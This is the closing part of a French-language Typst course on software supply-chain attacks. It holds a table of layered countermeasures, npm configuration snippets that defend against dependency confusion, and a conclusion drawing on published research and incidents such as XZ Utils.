  fill: rgb("#f8fafc"),
  stroke: 0.5pt + luma(200),
  radius: 4pt,
  inset: 10pt,
  width: 100%,
)[
  #table(
    columns: (auto, 1fr),
    stroke: none,
    fill: (_, row) => if calc.odd(row) { luma(248) } else { white },
    inset: 7pt,
    [*Couche*], [*Contre-mesures principales*],
    [Code source], [Signature de commits (GPG/Sigstore), branch protection, 2 reviewers minimum],
    [Dépendances], [Pinning + hash intégrité, audit automatique (pip-audit, npm audit), SBOM],
    [Build], [Build reproductible, environnement éphémère, permissions minimales (SLSA)],
    [Artefacts], [Signature (Cosign/Sigstore), hash publié, attestation SLSA L2+],
    [Distribution], [Canal TLS vérifié, vérification du hash à l'installation],
    [Runtime], [Scan d'image (Trivy), politique d'admission (OPA, Kubernetes)],
    [Gouvernance], [MFA sur tous les comptes de mainteneurs, audit des droits de publication],
  )
]

== Défense contre la Dependency Confusion

La Dependency Confusion est l'une des attaques les plus automatisables. Les défenses spécifiques incluent :

```bash
# .npmrc — Forcer le registre privé pour les scopes @acme
@acme:registry=https://registry.acme.internal/
always-auth=true

# package.json — Marquer les paquets internes comme privés
{
  "name": "@acme/auth",
  "version": "2.1.0",
  "private": true,
  "publishConfig": {
    "registry": "https://registry.acme.internal/"
  }
}
```

Autres mesures : configurer Artifactory ou Nexus pour bloquer automatiquement tout paquet public portant le même nom qu'un paquet interne ; utiliser la fonctionnalité `allowedPackages` de npm 9+ ; *réserver les noms* des paquets internes sur les registres publics (même en publiant des versions vides ou stub) pour prévenir leur enregistrement par un tiers.

// ============================================================
// CONCLUSION
// ============================================================

= Conclusion

Les attaques sur la supply chain logicielle représentent l'une des menaces les plus redoutables du paysage cybersécurité actuel, précisément parce qu'elles exploitent la confiance — confiance dans les mainteneurs, dans les registres, dans les gestionnaires de paquets — plutôt que des vulnérabilités techniques.

La recherche de Ladisa et al. @ladisa2023sok a cartographié pour la première fois de façon systématique l'étendue de ce problème : 117 vecteurs d'attaque, répartis sur 8 catégories, couvrant l'ensemble du cycle de vie logiciel depuis la contribution jusqu'à la distribution. Les incidents réels (event-stream, PyTorch-nightly, node-ipc, XZ Utils) illustrent la variété et la sophistication croissante de ces attaques.

Trois conclusions majeures émergent de ce cours. Premièrement, les antivirus traditionnels sont inefficaces (77 % de non-détection sur npm) car les techniques d'obfuscation et de transformation dynamique contournent les détections par signature. Des approches ML basées sur des features comportementales sont plus prometteuses @ladisa2023crosslang, mais le taux de faux positifs reste un défi opérationnel.

Deuxièmement, l'installation d'un paquet tiers est sémantiquement équivalente à l'exécution de code arbitraire si le paquet est malveillant. Les hooks d'installation (I1-I3) et l'exécution au runtime (R1-R4) donnent à un attaquant un accès complet à l'environnement de build et aux secrets CI.

Troisièmement, il n'existe pas de défense unique et suffisante. La protection exige une approche multi-couches : évaluation du risque des dépendances (Scorecard, deps.dev), pinning avec vérification de hash, build reproductible et SBOM, signatures d'artefacts (Sigstore/Cosign), et gouvernance humaine (MFA des mainteneurs, revue de code systématique).

#keypoint[
  *La règle de l'attaquant patient* : XZ Utils montre qu'un acteur déterminé est prêt à investir deux ans de contributions légitimes avant d'agir. Aucun outil ne peut détecter seul cette menace. La diversification des mainteneurs, les processus de gouvernance clairs, et la traçabilité cryptographique des artefacts (SLSA) sont les seules réponses structurelles.
]

#pagebreak()

#bibliography("refs.bib", title: "Références", style: "ieee")
